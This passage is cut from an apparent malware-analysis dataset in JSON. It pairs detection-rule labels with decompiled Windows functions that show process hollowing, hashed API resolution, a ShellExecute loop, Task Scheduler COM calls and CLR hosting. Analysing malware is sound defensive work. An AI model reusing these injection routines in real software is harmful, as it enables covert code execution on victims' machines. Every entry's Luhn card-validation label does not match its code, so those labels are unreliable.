(*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n        iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n    }\n    return;\n}\n",
        "token_count": 647
    },
    "00403e75": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00403e75(uint param_1, uint param_2, uint param_3)\n\n{\n    uint lpSubKey;\n    int32_t iVar1;\n    uint arg_10h;\n    uint arg_14h;\n    \n    arg_10h = param_2;\n    arg_14h = param_3;\n    lpSubKey = fcn.0040a605(param_2, param_3, param_1);\n    iVar1 = fcn.0040a66b(0x80000001, lpSubKey, arg_10h, arg_14h);\n    if (iVar1 == 0) {\n        fcn.00403dcd(param_2, param_3);\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "0040405f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0040405f(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint in_EAX;\n    uint lpSubKey;\n    uint32_t uVar2;\n    uint lpValueName;\n    uint dwType;\n    uint lpData;\n    \n    dwType = 3;\n    lpValueName = param_1;\n    lpData = param_2;\n    lpSubKey = fcn.0040a605();\n    cVar1 = fcn.0040a731(0x80000001, lpSubKey, lpValueName, dwType, lpData, in_EAX);\n    uVar2 = fcn.00403fe2(param_1, param_2);\n    return uVar2 & 0xffffff00 | (uVar2 != '\\0' || cVar1 != '\\0');\n}\n",
        "token_count": 187
    },
    "004043e2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint fcn.004043e2(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint unaff_EBX;\n    uint uVar5;\n    uint unaff_ESI;\n    \n    uVar1 = *0x41c6e0;\n    uVar5 = 0;\n    uVar2 = fcn.0040acd8(0x4181d0, 0xb, 0x9578a470);\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(uVar2);\n    if (iVar3 != 0) {\n        uVar2 = fcn.0040a88f(0x4181dc, 0x18, 0xb95480a2, 0);\n        pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, uVar2);\n        if (pcVar4 != NULL) {\n            uVar5 = (*pcVar4)(uVar1, 1, unaff_ESI, unaff_EBX);\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 251
    },
    "00404444": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404444(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    uVar1 = fcn.0040acd8(0x4181f8, 0xc, 0xd114847c);\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(uVar1);\n    if (iVar2 != 0) {\n        uVar1 = fcn.0040a88f(0x418208, 0xc, 0xf76aa2d5, 0);\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, uVar1);\n        if (pcVar3 != NULL) {\n            uVar4 = (*pcVar3)(arg_8h, 0, arg_ch, 0, arg_10h, arg_14h, arg_18h);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 254
    },
    "0040462d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040462d(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint extraout_ECX;\n    uint arg_ch;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint hMem;\n    \n    var_ch = 0;\n    cVar1 = fcn.00404602();\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.0040a88f(0x418218, 0x11, 0x49f568aa, 0);\n        arg_ch = 0;\n        fcn.00415506(uVar2, extraout_ECX);\n        uVar2 = fcn.00415629();\n        iVar3 = fcn.0040f021(uVar2, arg_ch);\n        if (iVar3 != 0) {\n            var_8h = 0;\n            iVar3 = fcn.0040f021(iVar3, &var_8h);\n            if (iVar3 != 0) {\n                hMem = 0;\n                var_10h = 0;\n                iVar3 = (*_sym.imp.CRYPT32.dll_CryptDecodeObjectEx)\n                                  (0x10001, 8, iVar3, var_8h, 0x8000, 0, &hMem, &var_10h);\n                if (iVar3 != 0) {\n                    fcn.004043e2(hMem, &var_ch);\n                    (*_sym.imp.KERNEL32.dll_LocalFree)(hMem);\n                }\n                fcn.0040af12();\n            }\n            fcn.0040af12();\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 385
    },
    "004046e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.004046e8(void)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint extraout_ECX;\n    uint arg_10h;\n    uint var_450h;\n    uint pExecInfo;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint *var_28h;\n    uint var_20h;\n    int32_t var_4h;\n    \n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    arg_10h = 0x41dc10;\n    arg_ch = fcn.0040acd8(0x41822c, 0x13, 0x81dfa34e, extraout_ECX);\n    fcn.0040be75(&var_450h, arg_ch, arg_10h);\n    sub.ntdll.dll_memset(&var_38h, 0, 0x38);\n    pExecInfo = 0x3c;\n    var_38h = 0xc640;\n    var_30h = fcn.0040acd8(0x418240, 5, 0x4d3fe08e);\n    var_2ch = fcn.0040acd8(0x418248, 9, 0x7cdfdd63);\n    var_28h = &var_450h;\n    var_20h = 0;\n    while( true ) {\n        var_34h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar2 = (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n        if ((iVar2 != 0) && (var_4h != 0)) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(1);\n    }\n    fcn.0040c13c();\n    cVar1 = fcn.004090a9();\n    if (cVar1 != '\\0') {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    return;\n}\n",
        "token_count": 478
    },
    "004047c6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004047c6(uint hProcess, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_288h;\n    int32_t var_280h;\n    uint var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint var_28h;\n    uint var_24h;\n    uchar var_20h;\n    int32_t var_1fh;\n    int32_t var_1bh;\n    uint var_15h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_40h = 0;\n    var_3ch = 0;\n    uStack60 = 0;\n    uStack56 = 0;\n    uStack52 = 0;\n    uStack48 = 0;\n    var_1h._0_1_ = 0;\n    var_24h = 0;\n    uVar2 = (*_sym.imp.ntdll.dll_ZwQueryInformationProcess)(hProcess, 0, &var_40h, 0x18, &var_24h);\n    pcVar1 = _sym.imp.KERNEL32.dll_ReadProcessMemory;\n    if ((-1 < uVar2) &&\n       (uVar2 = (*_sym.imp.KERNEL32.dll_ReadProcessMemory)(hProcess, var_3ch, &var_288h, 0x248, 0),  uVar2 != 0)) {\n        var_8h = var_280h;\n        uVar2 = fcn.0040ae05(0);\n        if (uVar2 != 0) {\n            var_10h = uVar2;\n            iVar3 = (*pcVar1)(hProcess, var_8h, uVar2, 0x400, &var_28h);\n            if (iVar3 != 0) {\n                iVar3 = *(uVar2 + 0x3c);\n                iVar4 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(hProcess, 0, arg_10h + 0xfe0, 0x1000, 0x40);\n                pcVar1 = _sym.imp.KERNEL32.dll_WriteProcessMemory;\n                if (iVar4 != 0) {\n                    iVar3 = *(iVar3 + uVar2 + 0x28) + var_8h;\n                    var_ch = iVar4 + arg_10h;\n                    (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(hProcess, iVar4, arg_ch, arg_10h, &var_8h);\n                    (*pcVar1)(hProcess, var_ch, 0x41c6e8, 0xfe0, &var_8h);\n                    *0xc = iVar4 + arg_14h;\n                    var_1fh = var_ch;\n                    var_20h = 0xb8;\n                    var_1bh._0_2_ = 0xb850;\n                    var_15h._0_2_ = 0xd0ff;\n                    var_15h._2_1_ = 0xc3;\n                    iVar3 = (*pcVar1)(hProcess, iVar3, &var_20h, 0xe, &var_8h);\n                    if ((iVar3 == 0) || (var_1h._0_1_ = 1,  var_8h != 0xe)) {\n                        var_1h._0_1_ = 0;\n                    }\n                    (*_sym.imp.KERNEL32.dll_FlushInstructionCache)(hProcess, 0, 0);\n                }\n            }\n            uVar2 = fcn.0040af12();\n        }\n    }\n    return uVar2 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 915
    },
    "00404923": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "terminate process"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404923(uint arg_8h)\n\n{\n    uint arg_10h;\n    char cVar1;\n    int32_t iVar2;\n    uint var_64h;\n    uint s;\n    uint hProcess;\n    uint hThread;\n    uint var_14h;\n    uint uStack20;\n    uint var_ch;\n    uint var_8h;\n    \n    arg_10h = *0x41c6e4;\n    var_ch = *0x41d8d8;\n    var_8h = 0;\n    sub.ntdll.dll_memset(&s, 0, 0x40);\n    hProcess = 0;\n    hThread = 0;\n    var_14h = 0;\n    uStack20 = 0;\n    var_64h = 0x44;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, 0x41d6d0, 0, 0, 0, 0x900000c, 0, 0, &var_64h, &hProcess);\n    if (iVar2 != 0) {\n        cVar1 = fcn.004047c6(hProcess, var_ch, arg_10h, arg_8h);\n        if (cVar1 == '\\0') {\n            (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 0);\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_ResumeThread)(hThread);\n            var_8h = var_14h;\n        }\n        fcn.0040c13c();\n        fcn.0040c13c();\n    }\n    return var_8h;\n}\n",
        "token_count": 373
    },
    "004049cb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004049cb(uint param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t unaff_ESI;\n    \n    if (unaff_ESI < *(param_2 + 0xc)) {\n        return unaff_ESI;\n    }\n    iVar1 = 0;\n    if (0 < param_3) {\n        puVar2 = param_2 + 8;\n        do {\n            if (unaff_ESI - puVar2[1] < *puVar2) {\n                param_2 = iVar1 * 0x28 + param_2;\n                return (*(param_2 + 0x14) - *(param_2 + 0xc)) + unaff_ESI;\n            }\n            iVar1 = iVar1 + 1;\n            puVar2 = puVar2 + 10;\n        } while (iVar1 < param_3);\n    }\n    return 0;\n}\n",
        "token_count": 226
    },
    "00405239": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405239(uint arg_8h, uint lpExistingFileName)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    char cVar3;\n    uint8_t uVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint lpPathName;\n    uint lpTempFileName;\n    \n    uVar7 = 0;\n    (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x104, &lpPathName);\n    (*_sym.imp.KERNEL32.dll_GetTempFileNameW)(&lpPathName, 0, 0, &lpTempFileName);\n    (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, &lpTempFileName, 0);\n    cVar3 = fcn.00404eb1(&lpTempFileName);\n    if (cVar3 != '\\0') {\n        fcn.0040d968(0x13, 0x3f);\n        uVar8 = 0x41c868;\n        uVar5 = fcn.0040acd8(0x417b60, 5, 0xb4d7cbf9, 0x41c868, 0x41ca70);\n        fcn.0040be75(0x41ca98, uVar5, uVar8);\n        pcVar2 = _sym.imp.SHLWAPI.dll_PathFindFileNameW;\n        uVar5 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(lpExistingFileName);\n        pcVar1 = _sym.imp.KERNEL32.dll_lstrcpyW;\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(0x41cca0, uVar5);\n        (*pcVar1)(0x41cea8, arg_8h);\n        uVar5 = (*pcVar2)(arg_8h);\n        uVar8 = 0x41ca98;\n        uVar5 = fcn.0040acd8(0x417b60, 5, 0xb4d7cbf9, 0x41ca98, uVar5);\n        fcn.0040be75(0x41d2b8, uVar5, uVar8);\n        (*pcVar1)(0x41d4c0, &lpTempFileName);\n        uVar4 = fcn.004051f0();\n        uVar7 = uVar4;\n    }\n    uVar6 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(&lpTempFileName);\n    return uVar6 & 0xffffff00 | uVar7;\n}\n",
        "token_count": 580
    },
    "00405345": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: pszStart\n// WARNING: Variable defined which should be unmapped: pszFirst\n// WARNING: Variable defined which should be unmapped: hLibModule\n\nvoid __cdecl fcn.00405345(uint lpLibFileName)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint hLibModule;\n    uint pszFirst;\n    uint var_24h;\n    uint pszStart;\n    uint var_19h;\n    uint var_4h;\n    \n    fcn.00415eec(0x4191b0, 0x1c);\n    *(unaff_EBP + -0x19) = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(*(unaff_EBP + 8), 0, 2);\n    *(unaff_EBP + -0x2c) = iVar1;\n    if (iVar1 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_FindResourceW)(iVar1, 1, 0x18);\n        if (iVar2 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_SizeofResource)(iVar1, iVar2);\n            if (iVar3 != 0) {\n                iVar1 = (*_sym.imp.KERNEL32.dll_LoadResource)(iVar1, iVar2);\n                if (iVar1 != 0) {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar1);\n                    *(unaff_EBP + -0x28) = iVar1;\n                    if (iVar1 != 0) {\n                        *(unaff_EBP + -0x20) = 0;\n                        *(unaff_EBP + -4) = 0;\n                        uVar4 = fcn.0040acc1(0x418254, 0xb, 0xd95d309b);\n                        uVar4 = (*_sym.imp.SHLWAPI.dll_StrStrIA)(*(unaff_EBP + -0x28), uVar4);\n                        *(unaff_EBP + -0x20) = uVar4;\n                        *(unaff_EBP + -4) = 0xffffffff;\n                        if (*(unaff_EBP + -0x20) != 0) {\n                            iVar1 = (*_sym.imp.SHLWAPI.dll_StrChrIA)(*(unaff_EBP + -0x20), 0x3e);\n                            if (iVar1 != 0) {\n                                uVar4 = fcn.0040a88f(0x418260, 4, 0x446346db, 0);\n                                iVar2 = (*_sym.imp.SHLWAPI.dll_StrSpnA)(iVar1 + 1, uVar4);\n                                uVar4 = fcn.0040a88f(0x418268, 4, 0x4d6b2e52, 0);\n                                iVar1 = (*_sym.imp.SHLWAPI.dll_StrCmpNIA)(iVar1 + 1 + iVar2, uVar4, 4);\n                                if (iVar1 == 0) {\n                                    *(unaff_EBP + -0x24) = 0;\n                                    *(unaff_EBP + -4) = 1;\n                                    uVar4 = fcn.0040acc1(0x418270, 0x17, 0x6451a47b);\n                                    uVar4 = (*_sym.imp.SHLWAPI.dll_StrStrIA)(*(unaff_EBP + -0x28), uVar4);\n                                    *(unaff_EBP + -0x24) = uVar4;\n                                    *(unaff_EBP + -4) = 0xffffffff;\n                                    if (*(unaff_EBP + -0x24) != 0) {\n                                        uVar4 = fcn.0040a88f(0x418288, 0x14, 0xe4862072, 0);\n                                        iVar1 = (*_sym.imp.SHLWAPI.dll_StrStrIA)(*(unaff_EBP + -0x24), uVar4);\n                                        *(unaff_EBP + -0x19) = iVar1 != 0;\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(*(unaff_EBP + -0x2c));\n    }\n    fcn.00415f27();\n    return;\n}\n",
        "token_count": 1035
    },
    "00405e20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405e20(uint param_1)\n\n{\n    uint uVar1;\n    uint *arg_ch;\n    uint *arg_10h;\n    uint var_c8h;\n    \n    arg_ch = &var_c8h;\n    uVar1 = fcn.0040acd8(0x4184d8, 0x1c, 0x32a95ef3, param_1);\n    fcn.0040c52a(uVar1, arg_ch);\n    arg_10h = &var_c8h;\n    uVar1 = fcn.0040acd8(0x4184f8, 8, 0xd57c7a76, arg_ch);\n    fcn.0040be75(0x41daf0, uVar1, arg_10h);\n    return;\n}\n",
        "token_count": 185
    },
    "00405e79": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405e79(uint arg_8h)\n\n{\n    uint uVar1;\n    uint *arg_ch;\n    uint *arg_10h;\n    uint var_cch;\n    \n    arg_ch = &var_cch;\n    uVar1 = fcn.0040acd8(0x418504, 0x26, 0xe04c7424);\n    fcn.0040c52a(uVar1, arg_ch);\n    arg_10h = &var_cch;\n    uVar1 = fcn.0040acd8(0x4184f8, 8, 0xd57c7a76, arg_ch);\n    fcn.0040be75(arg_8h, uVar1, arg_10h);\n    return;\n}\n",
        "token_count": 173
    },
    "00405f8e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00405f8e(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    uVar1 = fcn.00406406();\n    if (uVar1 == '\\0') {\n        uVar1 = fcn.0040cbc0(arg_8h);\n        if (uVar1 != 0) {\n            var_8h = fcn.0040acd8(0x417b70, 5, 0xbbed6ef6);\n            uVar1 = fcn.0040cec3(arg_8h, &var_8h, 1, 4, fcn.00405ed0, &var_1h, 0, 0);\n        }\n    }\n    else {\n        var_1h._0_1_ = 1;\n    }\n    return uVar1 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 255
    },
    "004069b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004069b4(uint arg_8h)\n\n{\n    uint8_t *in_EAX;\n    uint arg_8h_00;\n    uint32_t uVar1;\n    uint var_18h;\n    uint uStack23;\n    uint uStack19;\n    ushort uStack15;\n    uchar uStack13;\n    uint32_t var_8h;\n    \n    arg_8h_00 = fcn.0040a88f(0x4185e0, 0x22, 0xd2e1762e, 0);\n    uVar1 = fcn.0040bf4f(arg_8h_00, *in_EAX);\n    if (uVar1 != 0) {\n        var_18h._0_1_ = 0;\n        stack0xffffffe5 = 0;\n        uStack23 = 0;\n        uStack19 = 0;\n        uStack15 = 0;\n        uStack13 = 0;\n        fcn.0040ee5a(var_8h, uVar1, &var_18h);\n        uVar1 = fcn.0040af12();\n        uVar1 = uVar1 & 0xffffff00;\n        var_8h = CONCAT11(var_18h, stack0xffffffe5);\n    }\n    return uVar1 & 0xffff0000 | var_8h & 0xffff;\n}\n",
        "token_count": 324
    },
    "00406b5e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00406b5e(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint lpString1;\n    ushort var_48h;\n    uint var_46h;\n    ushort uStack70;\n    ushort uStack68;\n    ushort uStack66;\n    ushort uStack64;\n    ushort uStack62;\n    uint pbstr;\n    uint var_30h;\n    ushort uStack48;\n    ushort uStack46;\n    uint var_28h;\n    ushort uStack40;\n    ushort uStack38;\n    int32_t var_20h;\n    int32_t *var_1ch;\n    int32_t psz2;\n    int32_t *ppv;\n    int32_t *var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    uVar2 = (*_sym.imp.ole32.dll_CoInitializeEx)(0, 0);\n    if (-1 < uVar2) {\n        iVar3 = (*_sym.imp.ole32.dll_CoInitializeSecurity)(0, 0xffffffff, 0, 0, 6, 3, 0, 0, 0);\n        if (-1 < iVar3) {\n            ppv = NULL;\n            iVar3 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x417728, 0, 1, 0x417518, &ppv);\n            if ((-1 < iVar3) && (ppv != NULL)) {\n                var_30h._0_2_ = 0;\n                var_30h._2_2_ = 0;\n                uStack48 = 0;\n                uStack46 = 0;\n                var_28h._0_2_ = 0;\n                var_28h._2_2_ = 0;\n                uStack40 = 0;\n                uStack38 = 0;\n                iVar3 = (**(*ppv + 0x28))(ppv, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);\n                if (-1 < iVar3) {\n                    uVar4 = fcn.0040acd8(0x418658, 1, 0xf163d155);\n                    pbstr = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(uVar4);\n                    var_1ch = NULL;\n                    iVar3 = (**(*ppv + 0x1c))(ppv, pbstr, &var_1ch);\n                    if ((-1 < iVar3) && (var_1ch != NULL)) {\n                        var_10h = NULL;\n                        iVar3 = (**(*var_1ch + 0x38))(var_1ch, 0, &var_10h);\n                        if ((-1 < iVar3) && (var_10h != NULL)) {\n                            var_ch = 0;\n                            iVar3 = (**(*var_10h + 0x1c))(var_10h, &var_ch);\n                            if ((-1 < iVar3) && (var_ch != 0)) {\n                                uVar4 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(0x41dc10);\n                                (*_sym.imp.KERNEL32.dll_lstrcpyW)(&lpString1, uVar4);\n                                (*_sym.imp.SHLWAPI.dll_PathRemoveExtensionW)(&lpString1);\n                                var_30h._2_2_ = 0;\n                                uStack48 = 0;\n                                uStack46 = 0;\n                                uStack40 = 0;\n                                uStack38 = 0;\n                                var_30h._0_2_ = 3;\n                                var_28h._0_2_ = 1;\n                                var_28h._2_2_ = 0;\n                                if (0 < var_ch) {\n                                    do {\n                                        var_8h = NULL;\n                                        iVar3 = (**(*var_10h + 0x20))\n                                                          (var_10h, CONCAT22(var_30h._2_2_, var_30h), \n                                                           CONCAT22(uStack46, uStack48), \n                                                           CONCAT22(var_28h._2_2_, var_28h), \n                                                           CONCAT22(uStack38, uStack40), &var_8h);\n                                        if ((-1 < iVar3) && (var_8h != NULL)) {\n                                            psz2 = 0;\n                                            iVar3 = (**(*var_8h + 0x1c))(var_8h, &psz2);\n                                            if ((-1 < iVar3) &&\n                                               ((psz2 != 0 &&\n                                                (iVar3 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(&lpString1, psz2),  iVar3 == 0\n                                                )))) {\n                                                var_20h = 0;\n                                                do {\n                                                    cVar1 = fcn.00406b41();\n                                                    if (cVar1 != '\\0') {\n                                                        var_1h._0_1_ = 1;\n                                                        break;\n                                                    }\n                                                    var_46h._0_2_ = 0;\n                                                    var_46h._2_2_ = 0;\n                                                    uStack70 = 0;\n                                                    uStack68 = 0;\n                                                    uStack66 = 0;\n                                                    uStack64 = 0;\n                                                    uStack62 = 0;\n                                                    var_48h = 0;\n                                                    iVar3 = (**(*var_8h + 0x30))(var_8h, 0, 0, 0, 0, 0);\n                                                    if ((-1 < iVar3) && (var_1h._0_1_ = fcn.00406b41(),  var_1h != 0))\n                                                    break;\n                                                    (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n                                                    var_20h = var_20h + 1;\n                                                } while (var_20h < 0x14);\n                                            }\n                                            (**(*var_8h + 8))(var_8h);\n                                        }\n                                        iVar3 = CONCAT22(var_28h._2_2_, var_28h) + 1;\n                                        var_28h._0_2_ = iVar3;\n                                        var_28h._2_2_ = iVar3 >> 0x10;\n                                    } while (iVar3 <= var_ch);\n                                }\n                            }\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        (**(*var_1ch + 8))(var_1ch);\n                    }\n                    (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                }\n                (**(*ppv + 8))(ppv);\n            }\n        }\n        uVar2 = (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    return uVar2 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1579
    },
    "004070b3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004070dc)\n// WARNING: Removing unreachable block (ram,0x00407137)\n// WARNING: Removing unreachable block (ram,0x00407148)\n\nuint32_t __cdecl fcn.004070b3(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *unaff_EDI;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    uVar1 = (**(*unaff_EDI + 0x2c))();\n    if (-1 < uVar1) {\n        uVar1 = var_4h;\n    }\n    return uVar1 & 0xffffff00;\n}\n",
        "token_count": 159
    },
    "00407168": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00407168(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint var_24h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *ppv;\n    int32_t *var_8h;\n    \n    uVar6 = 0;\n    uVar3 = (*_sym.imp.ole32.dll_CoInitializeEx)(0, 0);\n    if (-1 < uVar3) {\n        iVar4 = (*_sym.imp.ole32.dll_CoInitializeSecurity)(0, 0xffffffff, 0, 0, 6, 3, 0, 0, 0);\n        if (-1 < iVar4) {\n            ppv = NULL;\n            iVar4 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x417728, 0, 1, 0x417518, &ppv);\n            if ((-1 < iVar4) && (ppv != NULL)) {\n                iVar4 = (**(*ppv + 0x28))(ppv, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);\n                if (-1 < iVar4) {\n                    uVar5 = fcn.0040acd8(0x418658, 1, 0xf163d155);\n                    uVar5 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(uVar5);\n                    var_10h = NULL;\n                    iVar4 = (**(*ppv + 0x1c))(ppv, uVar5, &var_10h);\n                    if ((-1 < iVar4) && (var_10h != NULL)) {\n                        var_8h = NULL;\n                        iVar4 = (**(*ppv + 0x24))(ppv, 0, &var_8h);\n                        if ((-1 < iVar4) && (var_8h != NULL)) {\n                            cVar1 = fcn.00406ddf(var_8h, arg_ch, arg_10h);\n                            if (cVar1 != '\\0') {\n                                var_14h = NULL;\n                                iVar4 = (**(*var_8h + 0x3c))(var_8h, &var_14h);\n                                if ((-1 < iVar4) && (var_14h != NULL)) {\n                                    iVar4 = (**(*var_14h + 0x48))(var_14h, 1);\n                                    if (-1 < iVar4) {\n                                        uVar2 = fcn.004070b3(arg_8h, var_10h);\n                                        uVar6 = uVar2;\n                                    }\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                            }\n                            (**(*var_8h + 8))(var_8h);\n                        }\n                        (**(*var_10h + 8))(var_10h);\n                    }\n                    (*_sym.imp.OLEAUT32.dll_SysStringLen)(uVar5);\n                }\n                (**(*ppv + 8))(ppv);\n            }\n        }\n        uVar3 = (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    return uVar3 & 0xffffff00 | uVar6;\n}\n",
        "token_count": 781
    },
    "004072f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
